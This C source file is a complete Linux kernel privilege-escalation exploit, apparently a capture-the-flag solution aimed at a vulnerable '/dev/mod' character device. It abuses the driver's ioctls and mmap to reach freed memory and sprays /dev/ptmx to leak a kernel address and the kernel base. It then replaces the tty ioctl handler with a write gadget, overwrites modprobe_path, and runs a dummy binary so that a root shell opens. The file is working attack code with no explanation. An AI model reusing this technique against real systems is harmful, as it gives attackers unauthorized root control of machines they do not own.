#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <stdint.h>
#include <pty.h>
#include <sys/user.h>
#include <assert.h>

#define ull unsigned long long
#define LOCK_BOX 0x1337
#define UNLOCK_BOX 0x1338
#define SET_BOX 0x1339
#define RESIZE_BOX 0x133a
#define box_unlock() box_lock()
#define sBox struct box
#define commit_creds kbase + 0x80010
#define prepare_kernel_cred kbase + 0x803e0
#define stack_pivot_gadget kbase + 0x8e7bdb
// mov    esp,0xf6000000; ret
#define pop_rdi_ret kbase + 0x3707ec
#define pop_rdx_rdi_ret kbase + 0x3707eb
#define pop_rsi_ret kbase + 0x1f1b5
#define mov_rdi_rax kbase + 0x8e21c
#define fchmodat kbase + 0x190cc0
#define msleep kbase + 0xbc9e0
#define modprobe_path kbase + 0xe42a00
#define mov_qword_rdx_rsi kbase + 0x340967

struct box {
	uint64_t size;
	uint64_t key;
	void * ptr;
} Box;

int fd;

int box_lock()
{
	return ioctl(fd, LOCK_BOX, &Box.key);
}

int box_set(ull key)
{
	Box.key = key;
	return ioctl(fd, SET_BOX, &Box.key);
}

int box_resize(uint64_t size)
{
	Box.size = size;
	return ioctl(fd, RESIZE_BOX, &Box.size);
}

void * dev_mmap(void * addr, uint64_t size)
{
	void * _addr = mmap(addr, size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
	return _addr;
}


void shell()
{
        puts("[+] r00000t");
        system("echo '#!/bin/sh' > /home/user/x; echo 'setsid cttyhack setuidgid 0 /bin/sh' >> /home/user/x");
        system("chmod +x /home/user/x");
        int ff = open("/home/user/ffff", O_WRONLY|O_CREAT);
        write(ff, "\xff\xff\xff\xff", 4);
        close(ff);
        system("chmod 777 /home/user/ffff; /home/user/ffff");
        system("sh");
}

void exploit()
{
	pthread_t p_thread;
        box_set(0x2000);
	int ptmx[0x30];
	for(int i=0;i<0x30;++i)
		ptmx[i] = open("/dev/ptmx", O_RDWR|O_NOCTTY);
	for(int i=0;i<3;++i)
		box_resize(24);
	int fds[0x20];
	int bak = fd;
	for(int i=0;i<0x20;++i)
	{
		fds[i] = open("/dev/mod", O_RDWR);
		fd = fds[i];
		box_set(0x1337+i);
		box_resize(0x400);
	}
	fd = bak;
	Box.key = 0x2000;
	ull * addr = 0x13370000LL;
	box_lock();
	for(int i=0;i<0x20;++i)
	{
		fd = fds[i];
		Box.key = 0x1337+i;
		if(box_lock() == -1)
		{
			box_unlock();
			printf("Found at idx: %d\n", i);
			dev_mmap(0x13370000LL, 0x2000);
			fd = bak;
			Box.key = 0x2000;
			box_unlock();
			break;
		}
		box_unlock();
	}
	
	ull ptm_ops = NULL;
	int i;
	for(i=0;i<0x2000/8;++i)
	{
		if((addr[i] & 0xffff) == 0xf260)
		{
			ptm_ops = addr[i];
			break;
		}
	}
	if(!ptm_ops)
	{
		puts("Run again");
		exit(1);
	}
	ull kbase = ptm_ops - 0xa5f260;
	printf("[+] kernel base: %p\n", kbase);
	ull * fake_ops = malloc(0x400);
	memset((void *)fake_ops, 0, 0x400);
	fake_ops[12] = mov_qword_rdx_rsi; // ptm_unix98_ops.ioctl
	addr[i] = (void *)fake_ops;
	for(int idx=0;idx<0x30;++idx)
	{
                ioctl(ptmx[idx], 0x6d6f682f, modprobe_path);
                ioctl(ptmx[idx], 0x73752f65, modprobe_path+4);
		ioctl(ptmx[idx], 0x782f7265, modprobe_path+8);
	}
	addr[i] = ptm_ops;
	shell();
}

int main() {
	fd = open("/dev/mod", O_RDWR);
	assert(fd > 0);
	exploit();
	close(fd);
}
